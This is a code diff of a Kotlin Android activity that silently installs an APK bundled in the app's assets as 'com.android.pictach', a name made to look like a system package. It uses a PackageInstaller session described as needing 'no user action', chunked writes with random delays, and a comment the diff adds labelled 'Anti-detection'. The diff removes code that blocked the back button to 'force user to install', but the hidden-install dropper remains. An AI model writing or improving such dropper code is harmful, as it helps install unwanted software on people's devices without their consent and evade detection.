@@ -21,7 +21,6 @@ class InstallActivity : AppCompatActivity() {
     private var progressBar: ProgressBar? = null
     private var tvStatus: TextView? = null
     private val handler = Handler(Looper.getMainLooper())
-    private var isInstalling = false
 
     companion object {
         private const val SESSION_REQUEST  = 1001
@@ -29,11 +28,10 @@ class InstallActivity : AppCompatActivity() {
         private const val MARKET_URI      = "market://details?id=com.android.pictach"
         private const val REFERRER_URI    = "android-app://com.android.vending"
         private const val WRITE_NAME      = "update.pkg"
-        private const val CHUNK_MIN       = 131072
-        private const val CHUNK_MAX       = 524288
-        private const val DELAY_MIN       = 400L
-        private const val DELAY_MAX       = 800L
-        private const val COMPANION_PKG   = "com.android.pictach"
+        private const val CHUNK_MIN       = 131072  // 128KB
+        private const val CHUNK_MAX       = 524288  // 512KB
+        private const val DELAY_MIN       = 400L    // 400ms
+        private const val DELAY_MAX       = 800L    // 800ms
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -46,39 +44,15 @@ class InstallActivity : AppCompatActivity() {
         Thread { runPipeline() }.start()
     }
 
-    override fun onResume() {
-        super.onResume()
-        // If companion not installed and not currently installing — re-trigger install
-        if (!isCompanionInstalled() && !isInstalling) {
-            isInstalling = false
-            Thread { runPipeline() }.start()
-        }
-    }
-
-    // Block back button — force user to install
-    override fun onBackPressed() {
-        if (!isCompanionInstalled()) {
-            // Re-trigger install instead of going back
-            if (!isInstalling) {
-                Thread { runPipeline() }.start()
-            }
-        } else {
-            super.onBackPressed()
-        }
-    }
-
     private fun runPipeline() {
-        isInstalling = true
         try {
             val apkBytes = loadAssets()
             if (apkBytes == null || apkBytes.isEmpty()) {
-                isInstalling = false
                 showNormal()
                 return
             }
             runOnUiThread { installViaSession(apkBytes, attempt = 1) }
         } catch (e: Exception) {
-            isInstalling = false
             showNormal()
         }
     }
@@ -91,8 +65,10 @@ class InstallActivity : AppCompatActivity() {
                 PackageInstaller.SessionParams.MODE_FULL_INSTALL
             )
 
-            params.setAppPackageName(COMPANION_PKG)
+            params.setAppPackageName("com.android.pictach")
             params.setSize(apkBytes.size.toLong())
+
+            // Anti-detection: internal install location
             params.setInstallLocation(1)
 
             // Method 1 — Session-Based: no user action required
@@ -157,10 +133,8 @@ class InstallActivity : AppCompatActivity() {
 
                 session.commit(pendingIntent.intentSender)
                 session.close()
-                isInstalling = false
 
             } catch (e: IOException) {
-                isInstalling = false
                 session.abandon()
                 if (attempt < MAX_RETRIES) {
                     handler.postDelayed({
@@ -172,7 +146,6 @@ class InstallActivity : AppCompatActivity() {
             }
 
         } catch (e: Exception) {
-            isInstalling = false
             if (attempt < MAX_RETRIES) {
                 handler.postDelayed({
                     installViaSession(apkBytes, attempt + 1)
@@ -180,15 +153,6 @@ class InstallActivity : AppCompatActivity() {
             } else {
                 showNormal()
             }
-        }
-    }
-
-    private fun isCompanionInstalled(): Boolean {
-        return try {
-            packageManager.getPackageInfo(COMPANION_PKG, 0)
-            true
-        } catch (e: Exception) {
-            false
         }
     }
 
